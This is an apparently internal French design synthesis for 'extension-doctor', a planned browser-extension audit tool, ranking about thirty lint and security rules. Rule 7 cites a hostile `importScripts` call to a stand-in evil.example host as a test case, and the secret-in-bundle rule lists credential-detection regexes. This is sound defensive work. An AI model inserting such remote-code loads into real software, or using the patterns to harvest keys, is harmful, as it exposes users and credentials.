# extension-doctor — État de l'art consolidé (synthèse des 5 axes + T0)

**Date :** 2026-07-17
**Tâche VP :** k178w6xtbhcj10cdejkrfj3jwn8aqt5v (T0bis-RESEARCH), mission extension-doctor-v1
**Méthode :** synthèse pure. Zéro nouvelle recherche. Toute affirmation ci-dessous est reprise d'un des 6 documents suivants, cité par nom à chaque ligne :

- `extension-doctor-t0-design-2026-07-17.md` (T0)
- `ed-axis1-addons-linter-2026-07-17.md` (axe 1)
- `ed-axis2-chrome-store-review-2026-07-17.md` (axe 2)
- `ed-axis4-existing-auditors-2026-07-17.md` (axe 4)
- `ed-axis5-security-2026-07-17.md` (axe 5)
- `dot-skills-chrome-extension-2026-07-17.md` (dot-skills)

---

## §0 — COMPTES SOURCES (dérivés des documents, non retapés)

| Document | Compte annoncé DANS le document | Commande citée dans le document |
|---|---|---|
| T0 | 19 lignes de règles candidates réparties §2.1 (11 lignes) + §2.2 (8 lignes, dont 1 fusion interne explicite `tabs-query-unconfined` = `net-broadcast-unfiltered`) → **18 ids uniques** | lecture directe du document, pas de commande dédiée |
| axe 1 addons-linter | **119** messages totaux (`grep -h "^export const [A-Z_0-9]* =" src/messages/*.js \| wc -l` → 120 brut − 1 faux-positif fonction utilitaire) ; 32 détaillées en table sur les 119 | citée dans le document |
| axe 2 CWS | 18 lignes de critères en table (pas de compte agrégé annoncé par le document lui-même — dérivé par comptage des lignes de sa table) | table §Table des critères |
| axe 4 concurrence | 11 outils audités (table concurrentielle) | table §Table concurrentielle |
| axe 5 sécurité | 13 lignes de signaux en table | table §Table des signaux de sécurité |
| dot-skills | **67** règles (`metadata.json.totalRules`, confirmé par `find .../references -type f -name "*.md" ! -name "_sections.md" \| wc -l` → 67), sur **73** fichiers totaux | citée dans le document |

**⚠️ CONTRADICTION SIGNALÉE (non lissée)** : le brief de dispatch de cette tâche affirme « 20 règles candidates » pour le document T0. Le compte dérivé directement de la table T0 (§2.1 = 11 lignes + §2.2 = 8 lignes = 19 lignes brutes, 18 ids uniques après la fusion interne explicitement notée par le document lui-même) ne correspond ni à « 20 » ni à un multiple évident de ce nombre. Cette contradiction n'est pas dans mon compte — elle est entre le brief (qui n'a pas dérivé ce chiffre lui-même, exactement le pattern déjà signalé par dot-skills passe 2 pour « 63/63 » vs 73 réel) et le document source. Je retiens **18 ids uniques** parce que c'est la valeur dérivable par lecture directe de la table T0, pas la valeur citée dans un brief.

---

## §1 — MATRICE UNIFIÉE

Fusion et dédoublonnage des 5 sources. Chaque doublon signalé est expliqué en note. Seules les règles jugées mécaniquement détectables (au moins partiellement) figurent ici — le reste va en §4.

### 1.1 Manifest / packaging / permissions

| id | ce qu'elle détecte | source(s) fusionnée(s) | mécaniquement détectable ? (comment) | valeur | effort | faux positif redouté |
|---|---|---|---|---|---|---|
| `manifest-type-no-json` | `manifest.json` absent à la racine du ZIP livré (dossier zippé au lieu du contenu) | addons-linter `TYPE_NO_MANIFEST_JSON` (MPL-2.0, confirmé `addError` `src/linter.js:327`) | Oui — filesystem check trivial | 5 | 1 | aucun |
| `zip-integrity` | archive ZIP corrompue / entrées dupliquées / caractères invalides | addons-linter `DUPLICATE_XPI_ENTRY`/`INVALID_XPI_ENTRY`/`BAD_ZIPFILE` (MPL-2.0, confirmé `addError` `src/linter.js:118,126`) | Oui — lecture bas niveau ZIP | 4 | 2 | aucun — même classe de bug que notre historique release zip (commit `5d8b775`) |
| `manifest-permission-allowlist` | permission `manifest.json.permissions[]` hors d'une liste blanche déclarée par le produit | FUSION : addons-linter `MANIFEST_BAD_PERMISSION`/`MANIFEST_PERMISSIONS` (MPL-2.0) + dot-skills `net-request-minimal-permissions` (MIT, DÉJÀ-COUVERT) + axe 5 top-1 « Manifest permission allowlist » + axe 2 « Permissions — portée minimale » (CWS policy officielle) | Oui — diff `manifest.json.permissions[]` vs allowlist | 5 | 2 | mapping permission→API incomplet si la table de correspondance n'est pas exhaustive |
| `permission-unused-in-code` | permission déclarée dans le manifest sans usage détectable de l'API correspondante dans le bundle | FUSION : dot-skills `net-request-minimal-permissions` (facette « déclarée sans usage ») + axe 5 « `tabs` sans usage `tabs.query`/`tabs.create` » | Oui — cross-check statique `manifest.permissions` vs appels `chrome.<api>.*` dans le bundle transpilé | 4 | 2 | API appelée via bracket-notation (`chrome["tabs"]`) échappe au grep naïf — nécessite AST |
| `host-permissions-wildcard-broad` | `host_permissions` contient `<all_urls>` ou `*://*/*` | FUSION : addons-linter `MANIFEST_HOST_PERMISSIONS` (MPL-2.0) + axe 2 top-3 (CWS scrutiny/rejet documenté) + axe 5 top signal « accès à toutes les pages » | Oui — grep exact sur `host_permissions` | 5 | 1 | extension légitimement multi-site — nécessite allowlist déclarée |
| `host-permissions-content-scripts-mismatch` | un domaine présent dans `host_permissions` sans `content_scripts.matches` correspondant, ni feature documentée | axe 2 §Application (VD réel sur notre manifest : `*.x.ai` et `files.oaiusercontent.com` sans content_script match confirmé lié) + axe 5 top-2 « host_permissions = content_scripts.matches » | Oui — diff des deux tableaux du manifest | 3 | 1 | wildcard sous-domaine dynamique légitime — jugement humain sur le diff |
| `description-permission-mismatch` | un host/feature mentionné dans la description du store listing sans permission/content_script correspondant | axe 2 top-4 « Description ↔ host_permissions mismatch » — **VD réel confirmé sur notre propre manifest** (description mentionne « Cursor », zéro host_permission Cursor, Blocker B-2 du doc antérieur `docs/cws-pre-submit-checklist-2026-05-28.md`, confirmé toujours présent le 2026-07-17) | Oui (partiel) — comparaison texte description vs `host_permissions`/`content_scripts.matches` | 5 | 3 | mention marketing générique sans intention de host_permission (ex. "works with your favorite AI tools") — nécessite liste de hosts nommés explicitement, pas toute mention produit |
| `permission-required-vs-optional` | permission sensible (`tabs`, `downloads`, `cookies`, `history`) déclarée en `permissions[]` obligatoire plutôt qu'`optional_permissions[]` | axe 2 top-6 (CWS review-process scrutiny factors) — **VD réel** : `tabs` toujours en `permissions[]` obligatoire dans le manifest lu le 2026-07-17, recommandation antérieure (doc `cws-pre-submit-checklist-2026-05-28.md` M-1) non appliquée | Oui — lecture directe `manifest.json.permissions` vs `optional_permissions` | 4 | 1 | permission réellement nécessaire dès le premier run (pas de UX de demande différée possible) — jugement produit |
| `csp-not-weakened` | `content_security_policy.extension_pages` réintroduit `unsafe-eval` ou une source de script distante | FUSION : addons-linter `MANIFEST_CSP`/`MANIFEST_CSP_UNSAFE_EVAL` (MPL-2.0) + axe 2 (CWS validateur rejette un CSP invalide) + axe 5 top-5 | Oui — lecture directe de la clé manifest ; absence de clé = défaut MV3 implicite à documenter explicitement (pas supposer) | 5 | 1 | aucun — binaire sans ambiguïté |
| `zero-remote-code` | `eval(`, `new Function(`, `importScripts(http`, `import("http`, `<script src="http">` dans le **bundle buildé** | FUSION : addons-linter `REMOTE_SCRIPT`/`INLINE_SCRIPT`/`DANGEROUS_EVAL`/`NO_IMPLIED_EVAL` (MPL-2.0) + axe 2 top-1 (CWS cause de rejet majeure documentée MV3) + axe 5 top-3 | Oui — grep bloquant sur le bundle transpilé (jamais les sources, un bundler peut réintroduire ces patterns via une dépendance) | 5 | 2 | mot « eval » comme identifiant/méthode métier — nécessite word-boundary regex ; **audité ce soir sur notre propre bundle par axe 5, zéro occurrence confirmée** |
| `secret-in-bundle` | credential/API-key en clair dans le bundle (`sk_live_`, `AKIA`, JWT statique, PEM) | axe 5 top-4 — **avec réserve documentée par contrôle positif** : le pattern naïf `sk_[a-zA-Z0-9]{10,}` **rate** le format Stripe réel à underscore interne, pattern corrigé `sk_(live\|test)_[a-zA-Z0-9]{16,}` requis | Oui, avec réserve — regex par famille de clé, contrôle positif obligatoire avant tout verdict « propre » (measurement-integrity) | 5 | 2 | identifiants de test/fixture explicitement nommés `fake_`/`test_`/`mock_` — nécessite allowlist de préfixe |
| `banned-vulnerable-libs` | librairie JS tierce dans une liste noire connue de vulnérabilités, ou déconseillée/obsolète | addons-linter `BANNED_LIBRARY`/`UNADVISED_LIBRARY` (MPL-2.0, fingerprint via `Dispensary`) | Oui — fingerprint hash de librairies connues | 4 | 3 | faux nom de fichier ressemblant à une lib bannie sans en être une — dépend de la fiabilité du fingerprinting |
| `deprecated-removed-api` | appel à une API WebExtension dépréciée ou retirée en MV3, ou divergente Chrome/Firefox | addons-linter `DEPRECATED_API`/`DEPRECATED_CHROME_API`/`REMOVED_MV2_API` (MPL-2.0) | Oui — AST match contre table de compatibilité API versionnée | 5 | 3 | table de compatibilité incomplète pour notre cross-browser natif (Chrome/Edge/Firefox/Brave) |
| `content-script-file-exists` | `browser.tabs.executeScript()`/`chrome.scripting.executeScript` référence un fichier absent ou vide du paquet | addons-linter `CONTENT_SCRIPT_NOT_FOUND`/`CONTENT_SCRIPT_EMPTY` (MPL-2.0, confirmé `ESLINT_RULE_MAPPING`) | Oui — AST match + check filesystem croisé | 4 | 2 | directement transposable à `host-config.ts` cross-host |
| `runtime-external-messaging-exposure` | usage de `chrome.runtime.onConnectExternal`/`onMessageExternal` sans validation d'origine | addons-linter `RUNTIME_ONCONNECTEXTERNAL`/`RUNTIME_ONMESSAGEEXTERNAL` (MPL-2.0) | Oui — AST match | 3 | 2 | usage légitime avec validation d'origine déjà en place — nécessite lire la garde, pas juste l'appel |
| `web-accessible-resources-scope` | `web_accessible_resources.matches` dépasse `content_scripts.matches` | axe 5 top-8 | Oui — lecture statique + cross-check des deux tableaux manifest | 3 | 1 | ressources volontairement publiques (widget cross-site) |
| `postinstall-script-audit` | dépendance npm avec script `postinstall` non trivial exécuté à l'installation | axe 5 top-7 — **signal réel non résolu ce soir** : `bun install` a bloqué 1 postinstall dans notre propre repo, non investigué (§Non vérifié axe 5) | Oui — `npm ls --all --json` + lecture `scripts.postinstall` par package | 4 | 3 | build natif légitime (esbuild, playwright) — nécessite classification, pas blocage auto |
| `permission-diff-between-releases` | `manifest.json` gagne une permission entre deux tags git sans entrée changelog associée | axe 5 top-10 | Oui — diff git entre tags | 3 | 2 | montée de permission légitime documentée dans le changelog — la règle doit lire le changelog, pas juste le diff manifest |

### 1.2 Service worker / messaging / mémoire

| id | ce qu'elle détecte | source(s) fusionnée(s) | mécaniquement détectable ? | valeur | effort | faux positif redouté |
|---|---|---|---|---|---|---|
| `net-broadcast-unfiltered` | `chrome.tabs.query({})` sans filtre `url:` suivi d'un `sendMessage` en boucle vers tous les tabs | FUSION 4-SOURCES : T0 `net-broadcast-unfiltered` (dot-skills MIT `msg-avoid-broadcast-to-all-tabs`+`api-query-tabs-efficiently`) = T0 §2.2 `tabs-query-unconfined` (friction VP, Day 137, même défaut vu par une 2e source) = dot-skills passe 2 backlog ligne 3 (fusion officielle de `msg-avoid-broadcast-to-all-tabs` + `api-query-tabs-efficiently`) | Oui — AST : `chrome.tabs.query({})` (objet vide/sans clé `url`) alimentant une boucle `sendMessage` | 5 | 2 | query globale intentionnelle sans sendMessage en aval — vérifier présence du sendMessage, pas juste le query isolé — **MUST_BLOCK RÉEL prouvé 3× dans notre propre code : `projects-handler.ts:64-76`, `conversations-handler.ts:66`, `media-handler.ts:135`** |
| `sw-context-invalidated-guard` | `chrome.runtime.sendMessage` émis sans garde de contexte invalidé | FUSION : T0 (dot-skills `api-handle-context-invalidated`+`err-context-invalidation`, déjà fusionnées par dot-skills lui-même) — même id des deux côtés | Oui — grep : `sendMessage` non enveloppé try/catch ni précédé d'un check `chrome.runtime?.id` | 5 | 2 | wrapper centralisé qui fait la garde en interne — remonter à la déclaration, pas au call-site — **MUST_BLOCK RÉEL prouvé : `src/background/messaging.ts:51-52`** |
| `mem-cleanup-listeners` | `addEventListener` DOM host sans `removeEventListener` symétrique traçable | FUSION : T0 (dot-skills `mem-cleanup-event-listeners`) + dot-skills `comp-content-script-structure` (fusion partielle, même fix identifié dans leur propre backlog) | Oui — AST : `addEventListener` sans `removeEventListener` correspondant dans le scope de cleanup | 4 | 3 | listener volontairement permanent — liste d'exceptions déclarées requise | 
| `sw-no-keepalive` | `setInterval`/`setTimeout` utilisé pour maintenir un SW en vie au lieu de `chrome.alarms` | dot-skills `sw-avoid-keepalive`+`sw-use-alarms-api` (MIT, DÉJÀ-COUVERT — pas de défaut réel actuel, mécanisme prêt) | Oui — grep AST délai <30s dans fichier `background/*` | 3 | 2 | debounce UI légitime <30s — distinguer contexte SW vs UI |
| `sw-listeners-toplevel` | `chrome.*.addListener` enregistré dans un callback async plutôt qu'au niveau module | dot-skills `sw-register-listeners-toplevel` (MIT, DÉJÀ-COUVERT) | Oui — AST : ancêtre le plus proche non top-level | 3 | 2 | listener conditionnel top-level (`if (cond) chrome.x.addListener(...)`) reste valide |
| `custom-element-orphan-registration` | Custom Element rendu dans le JSX sans `customElements.define(...)` atteignable depuis l'entry-point | T0 friction VP, Day 137 — **MUST_BLOCK RÉEL prouvé, VD SIGNAL FORT audit react-doctor : `ui/lit-ui-register.ts`, module jamais importé depuis l'entry-point** | Oui — AST cross-fichier : tag names custom rendus vs fermeture transitive des imports depuis entry-points Vite | 5 | 4 | Custom Element enregistré par script tiers hors bundle — exception à documenter |

### 1.3 i18n

| id | ce qu'elle détecte | source(s) fusionnée(s) | mécaniquement détectable ? | valeur | effort | faux positif redouté |
|---|---|---|---|---|---|---|
| `i18n-key-coverage-gap` | une clé `t('x')` consommée dans le code mais absente d'une ou plusieurs locales `_locales/*/messages.json` | T0 friction VP, Day 137 — **MUST_BLOCK RÉEL prouvé : 6 clés (`edit`, `duplicate`, `favorite`, …) absentes des locales ce soir même** | Oui — diff `grep -rohE "t\(['\"][a-zA-Z_]+" src ui` vs `jq -r 'keys[]' _locales/{en,fr}/messages.json` | 5 | 2 | clé composée dynamiquement (`t(\`prefix_${variant}\`)`) non résolvable statiquement — échec bruyant requis (`INCONCLUSIVE`), jamais silencieux |
| `i18n-locale-json-validity` | validité syntaxique/nommage de `_locales/*/messages.json` — nom réservé `@@`, placeholder manquant, nom de placeholder invalide | addons-linter famille `NO_MESSAGE`/`PREDEFINED_MESSAGE_NAME`/`INVALID_MESSAGE_NAME`/`MISSING_PLACEHOLDER`/`INVALID_PLACEHOLDER_NAME`/`NO_PLACEHOLDER_CONTENT` (MPL-2.0, 6 règles — mini-linter directement applicable à `chrome.i18n`) — **règle DISTINCTE de `i18n-key-coverage-gap`** : celle-ci valide la syntaxe interne des fichiers locale, l'autre valide la couverture code↔locale. Ne pas fusionner malgré le domaine commun i18n. | Oui — parsing JSON + regex nommage | 4 | 2 | aucun signalé |

### 1.4 Code hygiène / structure

| id | ce qu'elle détecte | source(s) fusionnée(s) | mécaniquement détectable ? | valeur | effort | faux positif redouté |
|---|---|---|---|---|---|---|
| `unused-file-export` | export ou fichier jamais consommé ailleurs dans le repo | FUSION : T0 `unused-export` + `unused-file` (react-doctor, patterns observés — **MUST_BLOCK RÉEL : 5 barrels/composants morts prouvés dans l'audit react-doctor du soir même**) | Oui — AST cross-fichier | 3 | 3 | export public d'une lib partagée hors mono-repo ; script `qa/*.mjs` référencé en commentaire seul — exclusion `qa/`/`scripts/` requise |
| `no-barrel-import` | import depuis un `index.ts` barrel au lieu du module direct | T0 (react-doctor, observation — 11 occurrences réelles dans notre propre audit) | Oui — AST comparant chemin barrel vs chemin direct | 2 | 3 | barrel intentionnel pour API publique stable — liste de barrels autorisés requise |
| `style-file-kebab-case` | fichier `.ts`/`.tsx` en camelCase/PascalCase hors convention | FUSION : T0 `style-file-kebab-case` = dot-skills `style-file-naming` — **MÊME RÈGLE, MUST_BLOCK RÉEL identique prouvé par dot-skills : `waitForHostResponseDone.ts`, `MultiStepOrchestrator.ts`, `setNativeValueAndDispatch.ts`** | Oui — `find` + regex sur nom de fichier | 2 | 1 | composants Preact PascalCase par convention d'équipe — paramétrable par répertoire |
| `no-giant-component` | fichier composant UI dépassant un seuil de lignes | T0 (react-doctor pattern, notre propre audit : 3 fichiers >300L, régression post-D99 réelle) | Oui — `wc -l`, seuil configurable | 3 | 1 | composant long mais plat — pondérer par complexité cyclomatique, pas juste ligne count |

### 1.5 Doctrine-native — le différenciateur (mécanique avec limites explicites)

| id | ce qu'elle détecte | source(s) | mécaniquement détectable ? | valeur | effort | faux positif redouté |
|---|---|---|---|---|---|---|
| `host-signal-unverified` | sélecteur/attribut DOM host codé en dur dans un adapter sans preuve de capture DOM réelle jointe | T0 friction VP `j57fz82fvyfvmemak19e0d40zh88p7j6` (Day 102) | Oui — grep sélecteur littéral dans `adapters/**` sans commentaire `// verified:` pointant fixture datée | 5 | 4 (bloqué : convention `qa/dom-snapshots/<host>/` inexistante aujourd'hui) | API standard W3C (`document.documentElement.lang`) ne nécessite pas de vérification |
| `test-cannot-fail` | test dont l'assertion ne peut structurellement jamais rougir | T0 friction VP `j57fgja727z6acje743k3gm4d98ajxaq` (Day 131-132) | PARTIEL — détection statique jsdom+chrome.*/DOM mécanique mais insuffisante seule ; preuve définitive = sonde bipolaire par mutation | 5 | 5 (infra mutation-testing sur code tiers absente) | test jsdom légitime sur pure function (RULE #8 l'autorise) |
| `verified-not-activated` | correctif « publié » sans preuve que la version qui le porte est celle réellement servie | T0 friction VP `j576qsh9vj8903d79wm0kv97cx89sw5s` (Day 119) | Oui mais dépend d'un artefact externe (build-hash) absent du pipeline actuel | 5 | 4 (bloqué : convention build-hash non existante — non re-vérifié dans `vite.config.ts` par T0, cf. §7) | fenêtre de déploiement légitime — tolérance temporelle requise |
| `coexistence-collision` | deux tests contradictoires sur le même élément logique, le plus récent gagnant silencieusement | T0, Day 137 soir même (refactor D92-T5 checkbox→bouton re-cassant un fix D67, 5 semaines de vert cohérent régressé) | NON mécaniquement tranchable v0.1 — problème de correspondance sémantique inter-fichiers, premier jet possible mais FP/FN élevés sans données de calibration | 5 | 5 | composant à deux modes légitimes (desktop/mobile) — désambiguïser par contexte de rendu |
| `score-scope-provenance` | un score/ratio publié sans la ligne de commande complète qui l'a produit | T0, Day 137 (`--no-lint` → 92/100 vs run complet → 62/100, écart tracé dans l'audit react-doctor du soir) | N'est pas un scanner de code externe — contrainte de **format de sortie de l'outil lui-même** | 5 | 1 (contrainte CLI, pas une règle de scan) | aucun — contrainte structurelle interne |

### 1.6 Non mécanisables au sens strict — retirées de la matrice, renvoyées §4

Voir §4 pour la liste complète et le raisonnement.

---

## §2 — TOP-30 PRIORISÉ (trié valeur↓ puis effort↑)

Chaque entrée porte son MUST_BLOCK (le défaut réel qu'elle doit attraper) et son MUST_PASS (le légitime qu'elle ne doit pas bloquer). Les MUST_BLOCK dérivés d'un incident réellement vécu ce soir ou dans l'historique VP sont marqués **[VD RÉEL]**.

1. **`net-broadcast-unfiltered`** [VD RÉEL] — MUST_BLOCK : `chrome.tabs.query({})` non filtré dans `projects-handler.ts:64-76` (et 2 autres fichiers identiques). MUST_PASS : `chrome.tabs.query({ url: [...HOST_FEATURE_MATRIX] })` filtré par adapter.
2. **`sw-context-invalidated-guard`** [VD RÉEL] — MUST_BLOCK : `messaging.ts:51-52`, `sendMessage` sans garde. MUST_PASS : `sendMessage` appelé via wrapper centralisé qui fait la garde en interne.
3. **`i18n-key-coverage-gap`** [VD RÉEL] — MUST_BLOCK : les 6 clés absentes des locales trouvées le 2026-07-17. MUST_PASS : `t(\`prefix_${variant}\`)` composée dynamiquement, signalée `INCONCLUSIVE` plutôt que faussement verte.
4. **`custom-element-orphan-registration`** [VD RÉEL, SIGNAL FORT] — MUST_BLOCK : `ui/lit-ui-register.ts` jamais importé depuis l'entry-point. MUST_PASS : Custom Element enregistré par un polyfill navigateur tiers documenté en exception.
5. **`unused-file-export`** [VD RÉEL] — MUST_BLOCK : les 5 barrels/composants morts prouvés par l'audit react-doctor du soir. MUST_PASS : export public d'un package interne partagé multi-repo (hors scope mono-repo).
6. **`style-file-kebab-case`** [VD RÉEL] — MUST_BLOCK : `MultiStepOrchestrator.ts`, `waitForHostResponseDone.ts`, `setNativeValueAndDispatch.ts` (dot-skills, prouvés). MUST_PASS : `Button.tsx` composant Preact PascalCase, exempté par convention de répertoire déclarée.
7. **`zero-remote-code`** — MUST_BLOCK : `importScripts("http://evil.example/x.js")` injecté (aucun cas réel actuel — audité ce soir sans occurrence, cf. axe 5). MUST_PASS : `importScripts("./local-chunk.js")` chemin relatif packagé.
8. **`manifest-permission-allowlist`** — MUST_BLOCK : permission `debugger`/`management` ajoutée sans entrée dans l'allowlist produit. MUST_PASS : `storage`/`scripting`/`alarms` déjà justifiées dans le CLAUDE.md doctrine stack.
9. **`csp-not-weakened`** — MUST_BLOCK : `content_security_policy.extension_pages` réintroduisant `unsafe-eval`. MUST_PASS : absence de clé CSP custom (défaut MV3 documenté explicitement, pas supposé) — **état actuel confirmé ce soir par axe 5**.
10. **`description-permission-mismatch`** [VD RÉEL] — MUST_BLOCK : notre manifest actuel (« Cursor » en description, zéro host_permission Cursor, Blocker B-2 non corrigé). MUST_PASS : description mentionnant un usage générique sans nommer de host absent.
11. **`secret-in-bundle`** — MUST_BLOCK : `password="SuperSecretPass123!"` (mordu ce soir par le contrôle positif axe 5). MUST_PASS : `const fake_sk_test = "..."` préfixé `fake_`/`test_`/`mock_`. **NOTE : pattern `sk_[a-zA-Z0-9]{10,}` documenté comme insuffisant — utiliser `sk_(live|test)_[a-zA-Z0-9]{16,}`.**
12. **`host-permissions-wildcard-broad`** — MUST_BLOCK : `host_permissions: ["<all_urls>"]`. MUST_PASS : `host_permissions` scopés à 6 domaines nommés (état actuel confirmé conforme par axe 2).
13. **`mem-cleanup-listeners`** — MUST_BLOCK : `addEventListener` sur élément DOM host content-script sans `removeEventListener` correspondant traçable (pas de MUST_BLOCK réel identifié aujourd'hui — mécanisme dot-skills DÉJÀ-COUVERT, à calibrer par mutation). MUST_PASS : listener document-level intentionnellement permanent, déclaré en exception.
14. **`permission-unused-in-code`** — MUST_BLOCK : `alarms` déclaré sans feature nommée le reliant (signal « à vérifier » axe 2, pas encore un VD confirmé). MUST_PASS : `chrome.storage.session` couvert par la permission `storage` unique déclarée.
15. **`manifest-type-no-json`** — MUST_BLOCK : ZIP livré avec `manifest.json` sous un sous-dossier plutôt qu'à la racine. MUST_PASS : `dist/chrome/manifest.json` à la racine (état actuel, 17 fichiers confirmés par axe 5).
16. **`zip-integrity`** — MUST_BLOCK : entrée ZIP dupliquée détectée dans un rebuild passé (classe de bug de notre release v0.9.0.0, `5d8b775`). MUST_PASS : ZIP produit par `vite build` standard sans double-packaging.
17. **`banned-vulnerable-libs`** — MUST_BLOCK : lib fingerprintée avec CVE connue dans `node_modules` bundlé. MUST_PASS : Preact 3KB, aucune lib bannie identifiée dans `package.json` (déjà vérifié dot-skills `content-minimize-script-size`).
18. **`deprecated-removed-api`** — MUST_BLOCK : usage d'une API MV2 retirée en MV3. MUST_PASS : `chrome.action` (remplaçant MV3 documenté de `chrome.browserAction`).
19. **`content-script-file-exists`** — MUST_BLOCK : `content_scripts` manifest référençant un fichier supprimé du bundle. MUST_PASS : chaque entrée `content_scripts.js[]` résolue dans `dist/chrome/`.
20. **`i18n-locale-json-validity`** — MUST_BLOCK : clé `_locales/fr/messages.json` avec placeholder référencé mais non défini. MUST_PASS : nos fichiers `_locales/{en,fr}/messages.json` actuels (non audités syntaxiquement dans cette recherche — à faire par l'outil lui-même).
21. **`postinstall-script-audit`** — MUST_BLOCK : le postinstall bloqué signalé par `bun install` ce soir même (`Blocked 1 postinstall`), non encore classé. MUST_PASS : postinstall connu et documenté (build natif esbuild).
22. **`host-permissions-content-scripts-mismatch`** — MUST_BLOCK : `*.x.ai`/`files.oaiusercontent.com` en `host_permissions` sans `content_scripts.matches` confirmé lié (signal « à vérifier » axe 2, pas encore VD confirmé). MUST_PASS : `chatgpt.com`/`claude.ai`/`grok.com` avec matches identiques (conforme).
23. **`permission-required-vs-optional`** — MUST_BLOCK : `tabs` en `permissions[]` obligatoire au lieu d'`optional_permissions[]` (état actuel non corrigé confirmé le 2026-07-17). MUST_PASS : `optional_permissions` correctement scopée pour une feature opt-in.
24. **`web-accessible-resources-scope`** — MUST_BLOCK : `matches` de `web_accessible_resources` plus large que `content_scripts.matches`. MUST_PASS : ressource explicitement publique (logo widget cross-site) documentée.
25. **`runtime-external-messaging-exposure`** — MUST_BLOCK : `chrome.runtime.onMessageExternal` sans validation de `sender.id`. MUST_PASS : validation d'origine déjà présente dans le handler.
26. **`no-giant-component`** — MUST_BLOCK : les 3 fichiers >300L identifiés par l'audit react-doctor (régression post-D99). MUST_PASS : composant long mais plat (switch de rendu simple), pondéré par complexité cyclomatique.
27. **`no-barrel-import`** — MUST_BLOCK : les 11 occurrences réelles trouvées dans notre propre audit. MUST_PASS : barrel déclaré « autorisé » explicitement pour API publique stable de package interne.
28. **`network-destination-inventory`** — MUST_BLOCK : URL littérale dans le bundle non couverte par `host_permissions` (aucun cas réel trouvé ce soir — inventaire actuel 100% conforme, 1 seule destination réseau effective sur 9 domaines trouvés). MUST_PASS : `example-deployment-123.convex.cloud` couvert par `host_permissions` (confirmé). **Réserve documentée : preuve PROVABLE seulement si toutes les URLs de fetch/XHR sont des littéraux directs — les 3 `fetch()` à argument dynamique du bundle actuel restent INDICATIF, pas prouvés.**
29. **`permission-diff-between-releases`** — MUST_BLOCK : permission ajoutée entre deux tags git sans entrée changelog (aucun cas réel identifié — préventif). MUST_PASS : montée de permission documentée dans `CHANGELOG.md`.
30. **`sw-no-keepalive` / `sw-listeners-toplevel`** (fusion basse priorité, même famille dot-skills DÉJÀ-COUVERT sans VD actuel) — MUST_BLOCK : mutation injectée `setInterval(fn, 5000)` dans `background/service-worker.ts` en remplacement de `chrome.alarms`. MUST_PASS : usage actuel `chrome.alarms.create('sync-data', {...})` déjà en place, confirmé dot-skills.

---

## §3 — LE DIFFÉRENCIATEUR, argumenté

Croisement des 8 angles morts d'addons-linter (axe 1 §Angles morts) avec le verdict concurrentiel (axe 4 §Verdict concurrentiel HONNÊTE) :

| Angle mort addons-linter (axe 1) | Confirmé par axe 4 comme vide concurrentiel ? | Ce qu'extension-doctor fait ici |
|---|---|---|
| Cross-browser divergence active (Chrome vs Firefox comportement, pas juste conformité schéma) | Oui — aucun des 11 outils audités ne compare le comportement entre navigateurs | `HOST_FEATURE_MATRIX`/`host-config.ts` EST cette couche, doctrine déjà en place (CLAUDE.md Rule EXTENSIONS #7) |
| Comportement runtime réel (E2E dans un vrai navigateur) | Partiel — web-ext s'en approche (charge dans un vrai Firefox) mais reste mono-navigateur, ne valide pas de logique applicative cross-host | RULE #8 CLAUDE.md (real-Chrome E2E obligatoire) est déjà une doctrine produit ; extension-doctor la mécanise |
| Performance / bundle size par domaine | Oui — les outils génériques (webpack-bundle-analyzer, 11.5M dl/semaine, le plus adopté de toute la liste axe 4) existent mais zéro spécialisation extension | Terrain vacant confirmé : bundle-size-par-layer-durable n'existe nulle part |
| Accessibilité overlays injectés | Oui — zéro règle a11y dans les 119 messages addons-linter, zéro outil concurrentiel audité ne couvre ça | Hors scope T0bis mais terrain vacant à noter pour v0.2+ |
| UX / collision DOM (Marker Registry) | Oui — concept absent du domaine addons-linter (AMO ne juge pas la robustesse face aux redesigns UI hôtes) | `docs/inline-systems-marker-registry.md` EST cette doctrine, zéro équivalent normatif trouvé ailleurs |
| Score de maturité/maintenance dans le temps | Oui — addons-linter valide un artefact statique à un instant T | Layer 6 (Score 0-100 CLAUDE.md) comble ce vide |
| Détection de « wrapper fragile » (dépendance à structure DOM précise d'un host) | Oui — concept absent, confirmé « zéro équivalent normatif ailleurs » par axe 1 lui-même | Doctrine « layers durables > wrappers fragiles » = axe de différenciation propriétaire prouvé, pas emprunté |
| Politiques Chrome Web Store spécifiques (vs Mozilla-only addons-linter) | Oui — addons-linter est Mozilla-only, CSP/manifest alignés Firefox pas garantis équivalents CWS | axe 2 comble ce vide directement dans ce livrable |

**Réponse franche** : ce que extension-doctor fait que personne ne fait — confirmé par recherche négative documentée en axe 4 (`WebSearch query="\"extension-doctor\" OR \"extension doctor\" CLI browser extension audit tool"` → zéro résultat correspondant) — c'est l'**intersection** de trois choses qui existent séparément ailleurs mais jamais ensemble : (1) des règles **nées de bugs réellement shippés en prod sur NOTRE produit**, datées et sourcées, que ni un linter générique (spec-driven) ni un scanner sécurité (CVE-driven) ne peut avoir par construction ; (2) un **score composite orienté dev-workflow** (pas sécurité) — terrain vacant confirmé entre "linters purs sans score" (addons-linter, web-ext) et "scanners sécurité avec score mais hors-domaine" (CRXcavator, crx-analyzer) ; (3) une **doctrine anti-wrapper-fragile mécanisée** (HOST_FEATURE_MATRIX, Marker Registry) qui n'a strictement aucun équivalent normatif chez Mozilla ni chez aucun des 11 concurrents audités. C'est défendable précisément parce qu'un concurrent sans nos incidents ne peut pas reproduire (1) — c'est la seule douve non copiable de cette liste.

---

## §4 — HORS PÉRIMÈTRE MÉCANIQUE

Reprises honnêtes des sections « ce qui n'est pas détectable » des 3 documents qui en traitent explicitement (axe 2, axe 5, T0) :

| Critère | Pourquoi hors mécanique | Source |
|---|---|---|
| Single Purpose (« narrow and easy to understand ») | jugement humain sur cohérence thématique — un linter peut compter les domaines fonctionnels déclarés mais pas juger si c'est « un seul sujet » au sens Google | axe 2 |
| Minimum Functionality (« provide value ») | jugement qualité produit, détectable seulement dans les cas dégénérés (extension vide/template) | axe 2 |
| Deceptive/misleading marketing (screenshots, vidéo, wording du store listing) | contenu du dashboard CWS, pas du repo | axe 2 |
| Frontière minification/obfuscation dans les cas limites | Google elle-même reconnaît une zone grise (« legitimate minification » vs « concealment ») | axe 2 |
| « Strictly necessary » data collection (règle effective 2026-08-01) | nécessite un mapping manuel feature→donnée→justification produit, pas automatisable sans taxonomie interne | axe 2 |
| Fake reviews / manipulation du placement | comportement hors code, non observable dans un repo | axe 2 |
| Durée réelle de review CWS | dépend de la charge interne Google, aucun signal côté repo | axe 2 |
